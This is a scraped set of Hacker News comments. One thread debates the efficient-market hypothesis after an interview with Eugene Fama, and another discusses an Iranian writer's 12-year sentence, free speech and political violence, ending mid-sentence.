that's quite another. As Keynes famously put it: > In the long run, we're all dead. Economists set themselves too easy, too useless a task, if in tempestuous seasons they can only tell us, that when the storm is long past, the ocean is flat again. There's an interesting analogy with non-Turing-complete programming languages that guarantee program termination. In the real world, a guarantee that a program will terminate eventually is often not particularly useful. What we really want is a guarantee that it will terminate within some reasonable period of time. reply gmd63 4 hours agoparentprevThey don't seem to. People who exploit the reality of markets, that they are vulnerable to hype and speculaiton, seem to run away with more and more money, leading more and more people to engage in fraudulent SPAC dumps, meme stocks, lobbying for Trumpian deregulation, Tesla levels of fanbase engineering, and wash trading crypto coins. The market is rife with information asymmetry that seems to be increasing, and for it to trend toward efficiency, we would need that to be trending downward. reply lenerdenator 5 hours agoparentprev> Maybe this is a revelation to…someone? I don’t know why Eugene Fama saying this in 2024 is considered news. The guys entire body of research since the 1960s is about market inefficiencies. Because there are still significant numbers of people, many of whom are in positions of power, who think that increases in market efficiency solve all problems in a society. When you have people thinking that shortages of things like \"food\", \"medicine\", \"shelter\", and \"water\" can be solved by simply adjusting prices until some people can no longer participate in the market, you don't have a hypothesis, you have a cargo cult, and a psychopathic one at that. reply jongjong 9 hours agoparentprevI understand that economists are essentially saying that the markets are efficient in the sense that public information is factored into the price of assets in real time. My issue with this idea is that many human beliefs are founded on collective delusions. The market can stay irrational longer than you can stay solvent. So the distinction in the definitions of efficiency doesn't matter since public information and knowledge is highly flawed. What does it mean if incorrect assumptions are factored into the price? It doesn't make sense to call that efficient. reply TheOtherHobbes 8 hours agorootparentIt doesn't make sense because it's a dogma used for political ends, not science. I suppose that's efficient in its own way, if you're one of the relatively few oligarchs and wannabes who benefit from it. To anyone rational and politically literate, these and other expedient mainstream superstitions are obvious nonsense. reply jampekka 6 hours agoparentprev> Yes, obviously markets aren’t perfectly efficient and nobody believes they are. And yet all the currently popular theories (and narratives) of economics are founded on that assumption. The F-twist is really someting to behold, especially as the theories don't even work. reply pembrook 5 hours agorootparentWhile this is the “armchair internet commenter” narrative I was talking about that everybody has parroted going back to the news group days, it just isn’t true. Do you actually believe everyone in the entire field of economics believes people are robots? Or is it just convenient for you to hold that belief since it allows you dismiss an entire field of human endeavor in one sentence? reply jampekka 5 hours agorootparent> Do you actually believe everyone in the entire field of economics believes people are robots? They don't, but a lot of them work (and preach) as if they are. This is not perculiar to economics, but rather a general practice of scientific programmes in the Lakatosian sense. But few fields cause such harm with and are so politically motivated to protect their core assumptions. reply mikea1 5 hours agorootparentprevPopular with whom? Newtonian physics is 'popular' because it is easy to grasp with a high school education. Likewise, the theories of the early David Ricardo era are easy to understand, maybe popular, but not current with academics or practitioners. reply jampekka 5 hours agorootparentE.g. DSGE models are still rather popular with academics and practitioners. And the classical economics is largely how economists popularize their field and justify policy. reply littlestymaar 10 hours agoparentprev100 year? Did I accidentally wake up in 2070 without realizing? reply Terr_ 9 hours agorootparentNot OP, but I found an interesting list of works/events [0] indicating that the ideas were in circulation well before 1970. [0] http://www.e-m-h.org/history.html reply pembrook 9 hours agorootparentprevIt may surprise you to learn that these obvious ideas are older than you think. Wikipedia it. In fact, one of the main errors in Karl Marx’s theories from the mid-1800s was the belief that markets were perfectly efficient. He thought profits in a market economy would inevitably fall to 0. It turns out humans constantly want new and different stuff, in unpredictable fashion, and therefore this never happens. reply gdfgdsf 8 hours agorootparent> one of the main errors in Karl Marx’s theories Another one being the Intrinsic Theory of Value which he borrowed from Adam Smith. Marx allegedly postponed the publication of the 2nd volume of his Das Capital, when he learned about Marginalism, as it would require a complete revision of his theory, but died before he could do it. Von Mises writes that if that's true, Marx was way smarter than his followers. reply philipwhiuk 7 hours agorootparent> Marx was way smarter than his followers Well that's generally the case, I'd sort of be surprised if he weren't. reply datavirtue 3 hours agorootparentThe list of technologies adopted by the entire tech industry that are far removed or completely miss the point of their inventor is very long. reply ot1138 6 hours agoprevAs pretty much any professional trader or quant knows, there are degrees of efficiency. Ex-US markets are significantly less efficient than the US. Some US securities are less efficient than others. Certain instruments and exchanges are less efficient than others. Markets become more efficient as a result of entities who make them so. It is possible to make a very good living by being one of these entities. reply gmd63 4 hours agoparentAnd it follows that making a market inefficient through nefarious tactics allows said entities to continue to make a very good living. reply bjornsing 4 hours agoparentprevAt what time scales would you say these inefficiencies are easiest to make a good living from? reply financetechbro 4 hours agorootparentI think OP is referring to brokers and market makers, whose role is to help match buyers and sellers and to maintain liquidity in certain securities, respectively. In which case the time scale would be small (you don’t want to be caught holding something for too long if you’re just a middle man) reply mitchbob 9 hours agoprevhttps://archive.ph/YHXt8 reply cen4 10 hours agoprevSomeone needs to come up with a Efficient society hypothesis. Its weird Zuckerberg has accumulated all this data about social dynamics and no theories have emerged yet. reply cgio 9 hours agoparentAs relationships persist, the information content on the channels of said relationships diminishes in exchange for information efficiency. The channel becomes the omnipresent information. With a budget on information consumption, as the balance of persisted channels increases, the total actual information content circulated diminishes and replaced by \"heartbeat\" messages in established channels. The efficient society prunes relationships by means of time and circumstances to optimise information exchange. How Zuckerberg's innovation affected the efficiency of society is up for grabs. Disclaimer, this is not an actual theory or research based facts, just a random person responding to the challenge of parent. reply scandox 8 hours agoparentprevIt is folly to increase your wisdom at the expense of your authority. reply dredmorbius 7 hours agoparentprevConstituting and/or explaining what, particularly? reply 6510 10 hours agoparentprevThere is permaculture. Growing crops turned out an important part of it but the original thought was the design of a permanent culture. https://www.permaculturenews.org/what-is-permaculture/ https://en.wikipedia.org/wiki/Permaculture reply datavirtue 3 hours agoparentprevThey are trade secrets. reply smitty1e 10 hours agoparentprevEfficient Society hypotheses abound. They are called \"religions\". Their subjectivity helps inform the general human lack of scalability. reply gmd63 4 hours agoprevMarkets are efficient. At measuring who cares enough to calculate the price of something, who is exploiting it via fraud, how much society cares enough to investigate that fraud, how good the business actually is, how many people are pumping the stock without knowing anything about it, how many people are dumping the stock without anyone knowing about it, how many people have a grudge against the CEO, how many people want to have the CEO's babies, etc. That they are efficient in communicating what a company is worth on fundamental financial level is laughably incorrect and not even worthy of \"in best case scenario\" theorizing. What they are efficient at is capturing literally EVERY possible human motivation to buy, sell, or ignore, and distilling it into a single number. reply tarsinge 3 hours agoparentSure but that’s not the hypothesis, that’s your definition. Of course a definition is true. reply ittseta 7 hours agoprevThe Grossman-Stiglitz Paradox supports this. In fact, economist Grossman's hedge fund has delivered pretty good returns. https://en.m.wikipedia.org/wiki/Grossman-Stiglitz_Paradox reply GrantMoyer 6 hours agoprevLots of comments here are related to \"efficient\" and \"market\", but completely unrelated to the \"efficient-market hypothesis\"[1]. The efficent-market hypothesis is not general supposition that for example all markets are efficient by all definitions, nor that free-market capitalism is efficient. It's a specific hypothsis the prices of financial assets like stocks represent the true expected value[2] of the assets, including when accounting for future retuns. The supposed mechanism driving the property is that finacial asset markets are effectively servo systems[3]; traders trade based on any measureable information and act as feedback which drives prices to the expected values, so any other variables which may affect prices are therefore unmeasurable. Personally, it seems clear to me the hypothesis is literally false. Someone has to have the most actionable information or be the best at measuring. On the other hand, it seems clear that it's practically true for almost all people. The chance that any given person can measure an asset's true value the best is practically negligible. I certainly don't believe I can beat the market. [1]: https://en.wikipedia.org/wiki/Efficient-market_hypothesis [2]: https://en.wikipedia.org/wiki/Expected_value [3]: https://en.wikipedia.org/wiki/Servomechanism reply creer 1 hour agoparent> I certainly don't believe I can beat the market I was with you until this step. That markets are not close to efficient (in the sense of EMH) seems right to me. BUT it does not follow that because of that anyone should be able to beat the market. There is a huge gap between EMH being far from reality (or simply not close) - and that gap being exploitable. (Or more generally, non-EMH doesn't say much as to whether or how things should be exploitable.) For one thing we humans are humans, report to humans, get our news from humans, share this market with humans, etc, and the ones of us who pay attention know how hard it is to account for that. reply TeaBrain 5 hours agoparentprevRobert Shiller, who had long been one of the most vocal critics of the efficient market hypothesis and the idea of efficient markets, shared the Nobel Prize in economics alongside Eugene Fama in 2013. Shiller is also well known for the Case-Shiller Home Price Index. https://www.nobelprize.org/prizes/economic-sciences/2013/sum... reply daft_pink 5 hours agoprevI think it’s a useful model to understand what should happen under ideal conditions, but it’s not true 100% of the time as participants don’t always act rationally or make correct preditions about the future. It’s a pretty good tool for analyzing markets and understanding what’s happening. Like anything, it’s impossible to create an abstraction that’s 100% correct or works in all circumstances when discussing a massive dynamic system that is the real world and life. reply dekken_ 5 hours agoparentSimilarly, there's no such thing as \"an ideal gas\" reply nuc1e0n 5 hours agoprevInteresting hypothesis. But what is the speed of news when filtered through the brains of whole populations of people? It often takes people some time to come to terms with new information to the point where they feel comfortable to reshare it with others. Cognitive dissonance is a powerful resistive force. The study of the spread of memes is something that's the subject of research currently. reply financetechbro 4 hours agoparentThis isn’t always the case with algorithmic trading, but I see your point reply Kon-Peki 5 hours agoprevA very good discussion about market efficiency with Fama and Thaler from a number of years ago (maybe a month or two before Thaler won a Nobel Prize): https://www.youtube.com/watch?v=bM9bYOBuKF4 reply lvl155 6 hours agoprevEfficient market is suppose to ratably reward risk taking. Does not happen in modern financial markets. reply littlestymaar 11 hours agoprevThe efficient market hypothesis, like many things in economics, has been named in a very ideological way (Fama himself agreed with that). First of all in has nothing to do with markets in the general economic sense, as it's merely about financial markets. And then it has nothing to do with “efficiency” in any sense (neither the common sense or the usual economic sense of the word). In fact it's kind of the opposite of efficiency, because when the efficient market hypothesis is true, then it means that the market makers are losing money compared to the passive investors, and that's very inefficient: it gives nobody an incentive to perform the work of capital allocation and instead incentivize everyone to be freeloading on other people's work. reply api 10 hours agoprevIf markets were perfectly efficient there would be no entrepreneurs. To start a business of any kind is to hypothesize the existence of a market inefficiency, something the market is not currently doing that would make it more efficient. All business is in some sense arbitrage between state A, the market as it currently exists, and state B, the market with your business in it. A business succeeds if its hypothesis is correct and if it executes well. Also there's this: https://arxiv.org/abs/1002.2284 reply ianburrell 1 hour agoparentThat's a different definition of efficient than efficient-market theory. The theory is about the efficiency of the value of assets in the market to new information. It isn't about the efficiency of the businesses in the market or the market overall. The stock market prices are efficient, not the stock market companies. Efficient-market theory doesn't apply to startups because they aren't listed on the stock exchange. The theory doesn't apply to small number of investors like VCs. It definitely doesn't apply to the business of the startup, or to the reaction of the market to the startup. It does apply when the startup goes public. reply robertlagrant 10 hours agoparentprevPresumably that wouldn't be the case for any innovative companies, though. There might not be Richard Bransons storming into existing markets and dominating them, but there would still be Microsofts and Googles. reply aqme28 9 hours agorootparentYou're assuming that startups are more innovative than large companies, but this is only true because the market is not efficient. An \"efficient\" enterprise would perfectly invest in innovation. reply princeb 9 hours agorootparent??????? emh doesn't mean everyone knows everything, it means the price accurately reflects available information. if an innovation was believed to be world changing, it would be worth a lot, if the belief changes, the price changes. reply creer 1 hour agorootparentAnd there is one problem: \"belief\". Some people can walk through Xerox PARC and bet their company on 3-4 things they see. Others can own Xerox PARC and bet their company on 3-4 largely different things. In EMH there is cooked in some notion of overall largely rational beliefs, and yet the shares trade hands from someone selling to someone buying - both of which feel they got a good deal worth making money from. reply TheOtherHobbes 8 hours agorootparentprev\"Belief\" being the key word. The economy is a faith-based construct. Prices aren't set by \"information\", but by faith in value - which is one of the easiest things in the world to lie about. reply robertlagrant 7 hours agorootparentThis isn't related. You're zooming way out to \"how do we know anything, man?\" This is far more specific a topic than that. reply littlestymaar 9 hours agorootparentprevWhy would anyone finance an innovative company if financing companies yourself was always less profitable in the longer term than passively investing (which is what efficient market hypothesis is about)? In fact if the EMH was true, then all hope for financing innovative companies would come from delusional investors making the sub-optimal choice of investing there. How “efficient”. reply robertlagrant 9 hours agorootparentBut the market only has access to public companies. It wouldn't know about anything non-public, would it? And when a company went public, in a perfectly efficient market all the share prices would instantly rebalance to take that new company into account. reply littlestymaar 9 hours agorootparent> It wouldn't know about anything non-public, would it? Why? Then how would be all your stealth companies supposed to raise enough money in the first place? Or attract customers? In practice most companies are publicly known as early as series A at least and remaining unnoticed for longer requires lots of effort that would definitely hamper the growth of such companies. And the market definitely takes rising competitors, even private, into account when assessing the financial prospect of existing public companies. reply robertlagrant 1 hour agorootparentNon-public companies don't advertise investment opportunities uniformly to the entire market of investors the way a public company does. reply littlestymaar 1 hour agorootparentEMH is about markets factoring in all available information, not just “uniformly advertised investment opportunities”. reply energy123 6 hours agoparentprevThere would be entrepreneurs, they'd just be making no economic rents. reply spencerchubb 4 hours agoparentprevNope. When conditions change in the world, that creates a gap in the market. Even if everything were perfectly efficient now there would still be a need for markets to change tomorrow reply asah 10 hours agoparentprev??? technology invention is not about \"market inefficiency\"... reply littlestymaar 9 hours agorootparentIt is if you factor in the fact that innovative companies need some kind of financing to begin with, and that if the EMH was true, then it would be irrational for any investor to fund them. reply Almondsetat 8 hours agoparentprevI mean, by the nature of entrepreneurs being humans and dying or simply quitting, the market would welcome new blood reply sharas- 7 hours agoprev\"Markets\" are rational as betting is rational. reply Horffupolde 6 hours agoprevIt’s not a hypothesis. It’s a model. reply User23 6 hours agoprevI’m confident that hysteresis prevents truly efficient markets. reply hunglee2 11 hours agoprevanyone who has been on the job search in 2024 can confirm reply whereismyacc 10 hours agoparentisn't the efficent market hypothesis just about asset pricing reply jagger27 9 hours agorootparentWe have very common terms for human assets: - human resources - headcount - talent equity - talent pool - cogs in the machine And countless more. We’re already priced as assets. Openly. reply jampekka 6 hours agoprevWater is wet. reply aetherson 8 hours agoprevNobody sensible believes that financial markets are perfectly efficient. On the other hand, nobody sensible believes they are completely inefficient, or trivially beatable. If you want evidence of this, feel free to go out and beat the market with long plays on the alpha you imagine you have. I think it's usually helpful, when trying to understand the world, to think, \"markets are pretty efficient, do they agree with me? If they don't, can I think of a real reason why this may be a case where they're wrong, or am I just engaging in wishful thinking?\" I think it is not usually helpful, when trying to understand the world, to be really mad about the EMH. reply onlyrealcuzzo 7 hours agoparentWhy does the market need to be beatable if it's inefficient? If the market is chaotic, you can't beat it just because you're smart. reply aetherson 7 hours agorootparentIf markets just randomly assign values to companies, you can beat them in two straightforward ways: 1. Just buy when the price is low and random variation will move the price higher eventually (or short when the price is high). 2. Ignore the market except to buy when a company is underpriced, then just have the company declare dividends or whatever and directly eat the profit that the market is stipulated to have underpriced. A very small investor in a random market might have difficulty with either of these strategies, but a reasonably well-capitalized investor would not. If you want to think up some kind of complicated model of difficult-to-take-advantage-of company pricing that is hard to exploit, really ask yourself whether that model is grounded in anything other than, \"I'm mad about the EMH.\" reply onlyrealcuzzo 7 hours agorootparent> 1. Just buy when the price is low and random variation will move the price higher eventually (or short when the price is high). 1. How do you know when the price is high or low? The market can remain irrational for a very long time (longer than you can stay solvent). 2. You can easily lose money shorting when you're right. People do it all the time. reply corimaith 6 hours agorootparentIf the market is assigning random values you could easily just use the uniform distribution to model what is high or low; Intuitively the median would the demarcating line. reply pixl97 5 hours agorootparentIsn't this just the saying \"time in the market beats timing the market\" reply aetherson 6 hours agorootparentprevThe very idea that the \"market can remain irrational\" implies a non-random price algorithm. reply energy123 6 hours agorootparentprevYou can't beat a geometric browning motion with mean return of zero using this method. reply aetherson 6 hours agorootparentCompanies never have a negative price. Also, just look at stock graphs. Companies are not priced by geometric browning methods. This is what I mean when I say that it's usually not helpful to try to make claims about the world based on, \"I'm really mad about the EMH.\" You end up making silly claims. reply em500 5 hours agorootparent> Companies never have a negative price. Also, just look at stock graphs. Companies are not priced by geometric browning methods. Geometric Brownian motion can't take negative values either, so I don't know what you think this proves. While it's true that stock prices don't literally follow geometric Brownian motions (+drift), you can't tell the difference from stock graphs. (You can tell the difference with statistical tests if you know what to look for, e.g. volatility clustering, but humans can't tell by eye, and naive classification ML models will not perform well.) reply aetherson 4 hours agorootparentI admit that I assumed that \"geometric browning motion\" was just \"a random walk with more extreme movements when it goes away from the starting place,\" and that was wrong. What geometric browning motion in fact is, with some handwaving simplicity, is exponential growth with some jitter. I will note that \"stocks are priced via geometric browning motion\" would satisfy the EMH. And that the underlying growth trend of GBM, in a real world, is, like, \"the stock market actually values real things about the company that you can find out, but which other people have already found out.\" reply RandomLensman 7 hours agorootparentprevChaotic doesn't necessarily imply there is no way to make pretty accurate forecasts for some horizons (weather would be an example of that). reply immibis 7 hours agorootparentSome people, like Warren Buffett, do exactly that. But the forecasting is very difficult. It's a full time job for them, and they have the industry connections to obtain information that you or I can't. reply bell-cot 6 hours agorootparentYep. Plus, any investment strategy which involves \"if I'm as good at this as Warren Buffett\" is 99.999% likely to fail. reply energy123 6 hours agorootparentprevIf it's random (I assume that's what you mean by \"chaotic\") then it's efficient by definition because future price changes aren't a function of historical prices or publicly available information. reply mypastself 7 hours agoparentprevThat’s exactly it. I view it almost like Newtonian physics. Sure, it’s inaccurate at some level, but until we find a superior model, it’s safer to make your investment decisions based on it. reply xg15 8 hours agoprevI think a better word would be \"religious dogma\" instead of hypothesis. reply ath3nd 5 hours agoparentWait until you hear about: - \"The law of supply and demand\" - \"Trickle down economics\" or, my favorite: - \"The invisible hand of the market\" reply sylware 9 hours agoprev [3 more] [flagged] truckerbill 8 hours agoparent [–] I bet most of the authors and proponents of that hypothesis don't actually think it at all. It's justification aimed at useful idiots. reply sylware 6 hours agorootparent [–] I guess this is the brain-washing required to \"motivate\" those \"useful idiots\". reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "Economist Eugene Fama emphasizes that the Efficient Market Hypothesis (EMH) is a theoretical model, not a reflection of reality.",
      "The article discusses the limitations and controversies surrounding EMH, highlighting that markets are not perfectly efficient but the hypothesis remains a useful framework.",
      "Fama's interview underscores that while markets adjust quickly to information, they are influenced by various factors, including non-tangible values and cognitive biases, which prevent perfect efficiency."
    ],
    "points": 151,
    "commentCount": 150,
    "retryCount": 0,
    "time": 1725346903
  },
  {
    "id": 41429245,
    "title": "Iranian writer is sentenced to 12 years after tweeting a dot at supreme leader",
    "originLink": "https://www.npr.org/2024/09/02/g-s1-20579/iran-sentenced-12-years-tweet-supreme-leader",
    "originBody": "Middle East An Iranian writer is sentenced to 12 years after tweeting a dot at the supreme leader September 2, 20244:32 PM ET Jackie Northam Supreme Leader Ayatollah Ali Khamenei attends a meeting with the President Masoud Pezeshkian's administration, in Tehran, Iran, Aug. 27. Office of the Iranian Supreme Leader/AP hide caption toggle caption Office of the Iranian Supreme Leader/AP An Iranian writer and activist has been sentenced to 12 years in prison after replying with a single dot, or period, in response to a post on the social platform X by Iran’s supreme leader Ayatollah Ali Khamenei. Hossein Shanbehzadeh, a longtime critic of Iran’s leadership, was active on social media, supporting political prisoners and the removal of mandatory headscarves for women. He was sent to prison in 2019 for his online comments insulting Khamenei. He later wrote about the experience, including being flogged, according to Voice of America. In early June, 35-year-old Shanbehadeh was arrested in Ardabil, northwestern Iran. According to Radio Free Europe/Radio Liberty, he told his family he wasn’t sure why he was arrested, but it came shortly after he posted the response to Khamenei’s tweet, which showed the Iranian leader with the country’s national volleyball team. Sponsor Message The Islamic Republic's security forces on Tuesday arrested Iranian blogger, writer and proofreader Hossein Shanbehzadeh who, last month, posted a single dot in reply to Supreme Leader Ali Khamenei's tweet, and that comment was liked far more than Khamenei's original tweet.… pic.twitter.com/P4Bram1nr6 — Iran International English (@IranIntl_En) June 5, 2024 Shanbehzadeh’s post received far more “likes” than Khamenei’s original tweet, according to Iran International English. Culture Iranian rapper receives death sentence for songs criticizing the establishment Shanbehzadeh is just the latest activist to be caught up in the hard-line government’s crackdown on critics. Iran watchers say the leadership has felt insecure about the high level of dissent in the country for a while. Artists, playwrights, directors and others are also being swept up and given long prison sentences. In late April, Iranian rapper Toomaj Salehi was handed the death sentence for his antigovernment videos. Shanbehzadeh was sentenced to five years for alleged pro-Israel propaganda activity, four years for insulting Islamic sanctities, two years for spreading lies online and an additional year for anti-regime propaganda. His lawyer, Amir Raisian, told Shargh Network, a reformist newspaper in Iran, that he would appeal the verdict, especially the accusation of pro-Israel activity. The prosecutor’s office in Ardabil alleged that Shanbehzadeh had been in contact with Israeli intelligence officers and was arrested when trying to leave the country, according to Voice of America. Iran Ayatollah Ali Khamenei Facebook Flipboard Email",
    "commentLink": "https://news.ycombinator.com/item?id=41429245",
    "commentBody": "Iranian writer is sentenced to 12 years after tweeting a dot at supreme leader (npr.org)143 points by geox 20 hours agohidepastfavorite147 comments Dibby053 18 hours agoBuried under the rest of the article is this, since some people only do headlines I'll copy it here for visibility: >Shanbehzadeh was sentenced to five years for alleged pro-Israel propaganda activity, four years for insulting Islamic sanctities, two years for spreading lies online and an additional year for anti-regime propaganda. >His lawyer, Amir Raisian, told Shargh Network, a reformist newspaper in Iran, that he would appeal the verdict, especially the accusation of pro-Israel activity. The prosecutor’s office in Ardabil alleged that Shanbehzadeh had been in contact with Israeli intelligence officers and was arrested when trying to leave the country, according to Voice of America. reply avodonosov 18 hours agoparentI sometimes asked people on HN, what news sites they consider to be of decent quality. And npr.org was recommended several times. Seeing this cheap manipulative article suggests they were mistaken. PS. Maybe his 12 years sentence is completely unjust, I don't know. But titles like this... How about \"A man is sentenced to death after having cofee for breakfast\" for an article about Charles Manson? (I suppose he had cofee sometimes, so formally a true title). reply EasyMark 17 hours agorootparentSpeaking out against a repressive regime is always okay, the problem is it’s a violent repressive regime who will throw you in prison for criticizing it. So his 12 years sentence is completely unjust like nearly all of Iran’s tossing people in prison for simply expressing free thought. He was not trying to inspire violence. reply limit499karma 3 hours agorootparentprevTheir source is Iran International and that outfit is propaganda and agitprop oriented. It is as unbiased as their opposite number PressTV (run by IRI) or RT (Russian) or an ideologically committed red/blue outfit in US. These days Reuters is the closest thing to relatively unbiased reporting in the West. imo. reply pas 9 hours agorootparentprevit can still be decent quality despite having clickbait titles (which is nowadays basically a must in this \"media ecosystem\") but of course to a certain degree it's subjective. https://www.astralcodexten.com/p/sorry-i-still-think-i-am-ri... reply bufferoverflow 17 hours agorootparentprevnext [13 more] [flagged] defrost 17 hours agorootparent> NPR is very very far left. Nonsense. Not even by US standards and absolutely not by global standards. Overall, we rate NPR (National Public Radio) Left-Center Biased (a slight to moderate liberal bias) based on story selection that leans slightly left and High for factual reporting due to thorough sourcing and accurate news reporting. https://mediabiasfactcheck.com/npr/ For comparison: Overall, we rate Ground News Least Biased based on publishing news stories from both sides of the political spectrum and appropriately labeling their bias. We also rate them mostly factual rather than High due to the use of poor sources that can publish false or misleading information; however, these news stories are typically reported by other credible media outlets meaning they most likely are factual. https://mediabiasfactcheck.com/ground-news/ So it's a toss up between the two; one with a mild left bias and high factual reporting Vs one with less bias but not so well researched. reply LAC-Tech 12 hours agorootparentWhere do Americans get this notion that their Overton window is to the right of the rest of the world? To the right of Canada and Western Europe, OK sure, but that's a tiny fraction of planet earth. Go check our Indian politics, which is more numerically represented of planet earth, and tell me the US is to the right of hindu nationalism. reply defrost 11 hours agorootparentNo idea. Perhaps you should ask an American? reply bufferoverflow 17 hours agorootparentprevNonsense? Show me 3 stories from NPR in the last month (among hundreds they've reported in that time frame) with a right-wing flavor. You know, things like articles against abortion, critical of Kamala, supporting mass-deportation of illegal immigrants, etc. reply defrost 17 hours agorootparentThey're left of the US centre (not global, US). Not \"far left\", not \"very far left\", and not \"very, very far left\". reply bufferoverflow 17 hours agorootparentOk, you failed to show a single article with the right-wing perspective. How are they not far-left again? reply 082349872349872 9 hours agorootparentI am reminded of an article from our (state) news agency, on the Biden->Harris transition, one sentence of which said (roughly translated) \"Trump is already trying to tar Harris as an extreme-leftist candidate, but then again, over there his point might be valid, for according to Wikipedia, there they believe being against the death penalty to be an extreme-left position.\" reply EasyMark 17 hours agorootparentprevNPR is not “very very far left”. It is left leaning, but their articles are notbased on pure opinion and conjecture like much of what I see in the right leaning news like Fox, and flat out lies in OAN/Newsmax/Breitbart/Twitter reply bufferoverflow 17 hours agorootparentShow me 3 stories from NPR in the last month (among hundreds they've reported in that time frame) with a right-wing flavor. You know, things like articles against abortion, critical of Kamala, supporting mass-deportation of illegal immigrants, etc. reply EasyMark 17 hours agorootparentI never claimed they had right leaning stories, they have many neutral articles which you are more than welcome to check out on your on time, but not on mine. reply avodonosov 17 hours agorootparentprevThanks, I will try it, probably. I asked people primarily not because I want good news sites for myself. For my news reading method polarized, manipulative and biased sources are sometimes more informative. But I am interested to know what people read and who they believe. Although, having a high quality source maybe useful to me. Also interesting to see novel approaches and experiments, like the bias measurement the ground.news seems to have. reply avodonosov 15 hours agorootparentBrowsed the ground.news a little. Seems interesting at first sight, thank you for the link. Strange that they consider bias as a spectrum between Left and Right. Doesn't make much sense to me, especially for the topics interesting me most. reply ripjaygn 15 hours agorootparentprevAP News has been posting fake news about Tesla, it's sad to see. reply christiangenco 19 hours agoprevI've been thinking a lot recently about where I would personally draw the line on what sorts of speech should be criminal. If someone publicly called for specific violence (ex: \"let's all meet at Joe's house to burn it down—I'll bring the lighter\") that feels to me like the sort of thing that would be useful to do something about instead of waiting for the actual crime to be committed. But publicly stating that you support a violent act that somebody else did? Criticizing widely accepted beliefs? Expressing that you don't like a particular sort of person? I don't see how we could possibly criminalize anything like that without neutering the ability for a society to come up with new ideas. Tim Urban's \"What's Our Problem\" has a great framing of this question: the sort of discourse needed for a high-rung \"idea lab\" requires that people are about to speak publicly in ways that appear to be \"spreading lies online\" (one of the crimes Shanbehzadeh, the Iranian writer, was apparently charged with). Without that freedom we all descend into tribal barbarism that leaves us stuck in the current set of ideas we happen to have right now. reply mapt 19 hours agoparentA liberal prohibition on violent speech is an aspirational privilege of a people who have solved all their social problems to such a degree that the credible threat of violence is never necessary for justice or progress. Or an aspirational privilege of an aristocracy who have solved all of their material problems at the expense of everybody else, and demand militant proactive protection of their hoard and their personal safety. In our history, the credible threat of social violence has been absolutely necessary for justice & progress on numerous occasions. It's why we have everything from civil rights for racial minorities to voting rights for women to labor rights for workers to generous benefits for veterans. The establishment response to somebody like a Martin Luther King is mockery and condemnation, and only when fear of a Malcolm X led uprising becomes salient does the political capital to sue for peace, form. reply kurthr 18 hours agorootparentI don't remember the effective social movements and resulting changes in society you describe coming from threats of violence (in the US). Whether it was suffrage or labor rights, the greatest power for violence was always with the status quo and not with those protesting. Often violence has brought about change in perception opposite to its intent. This was true in civil rights, gay rights, antiwar, and labor movements. So I disagree that prohibition of violent public speech is an aspirational privilege otherwise necessary for justice and progress. A terrorist Ghandi wouldn't have been as effective against the British Raj (who could and did kill indiscriminately). If you were talking about private speech (not threats), I would have some more understanding. reply red-iron-pine 3 hours agorootparentThe only reason you have a 40 hour workday are due to constant rioting and unrest. these strikes weren't just unhappy people with picket signs, they literally \"called in the Pinkertons\" to beat them into submission, and most of the strikes going back to the 1800s had some component of violence. Apropos of the date, the Pullman Strikes are the reason we have Labor Day as a national holiday. 70 people died during that strike and around 60 more were seriously wounded. Violence was common during strikes in the 1800s, but Pullman was especially chaotic -- but par for the course as global labor struggles went. reply sangnoir 17 hours agorootparentprev> I don't remember the effective social movements and resulting changes in society you describe coming from threats of violence (in the US) I can think of 2. The end of the reconstruction period (slash-start-of-Jim-Crow) was brought about by violence (and threats of violence). The newly-formed KKK and fellow travellers successfully used lynchings to deter the formerly enslaved from participating in the political process (as candidates and voters), which was the status quo. The Stonewall riots were were a another one - I'm certain there are more examples in between those 2. reply ywvcbk 13 hours agorootparent> end of the reconstruction period To be fair civil rights and relative racial equality was imposed by an (effectively) foreign army of occupation. That army leaving is what led to Jim Crow, there was hardly any meaningful bottom-top societal change since the local Republican governments could have never survived without significant external support anyway. KKK/etc. were effectively an unofficial enforcement branch / citizen militia of the local elites and state governments. IMHO the situation was a bit like the war in Afghanistan (just with a slightly narrower cultural gap). Women rights could only survive as long as the US/NATO force were there to impose them and they reverted to the status quo as soon as the foreign militaries left. reply ClumsyPilot 18 hours agorootparentprev> don't remember the effective social movements and resulting changes in society you describe coming from threats of violence (in the US). I mean there was the whole civil war thing… If a movement has millions of people, possibility of violence is implied if you piss then off enough. reply kurthr 18 hours agorootparentAgreed, but the US Civil war wasn't started over mean tweets or nasty letters. There were armies and battlefields. The Declaration of Causes of Seceding States wasn't threatening individual lives, but simply said that some states need not respect the federal union. Also, that threat of violence didn't lead to the success of the Confederacy, but to its destruction. reply Barrin92 18 hours agorootparentprev>In our history, the credible threat of social violence has been absolutely necessary for justice & progress Even in very similar Anglosphere cultures like Britain, a liberal constitutional monarchy, all of that had been achieved, even earlier in many cases, without the overt glorification of violence as a normal part of the political process. In fact liberal monarchies, even before they were democratic had done a pretty good job of delivering steady progress without being dogmatic on speech or even justifying violent revolution. Just assuming for a second we agree on a broad notion of progress if you draw the US on a graph next to her a little bit less rebellious peers I don't think it's that clear that the violence was necessary. reply defrost 17 hours agorootparentYou seem unfamiliar with the vast bulk of history of the \"Four Lions\" region (now called the United Kingdom). Just one snippet: The Peterloo Massacre took place at St Peter's Field, Manchester, Lancashire, England, on Monday 16 August 1819. Eighteen people died and 400–700 were injured when cavalry charged into a crowd of around 60,000 people who had gathered to demand the reform of parliamentary representation. As a peer comment points out there were many civil and uncivil wars. reply hollerith 17 hours agorootparentThe fact that you're using an incident that resulted in only 18 deaths to prove your point is evidence that, yes, England since the English Civil War has been an unusually peaceful and law-abiding part of the world. reply defrost 17 hours agorootparentThis one incident in English political history appears more violent than, say, the US Kent State massacre: The Kent State shootings were the killing of four and wounding of nine unarmed college students by the Ohio National Guard Is it your position that the US state has been more violent toward citizens than the \"liberal constitutional monarchy\" in the UK, less violent, or about the same. Modern English monarchy history easily traces back to 1066 and the political history to the issue of the Magna Carta in 1215. It's selective to limit political violence to last Civil War (of many warsrebellions of the last 800 years) and blinkered to claim that the modern UK doesn't put the boot in (eg: Thatcher during the miners strikes .. instigated by the Thatcher government in a deliberate ploy to break trade unions across all industries). https://en.wikipedia.org/wiki/Ridley_Plan https://en.wikipedia.org/wiki/Battle_of_Orgreave reply hollerith 16 hours agorootparentMy position is that both the UK since the end of the English Civil War (1646) and the US since the end of the American Civil War (1865) have been unusually free of internal political violence. In contrast, the Chinese Civil War (ending in 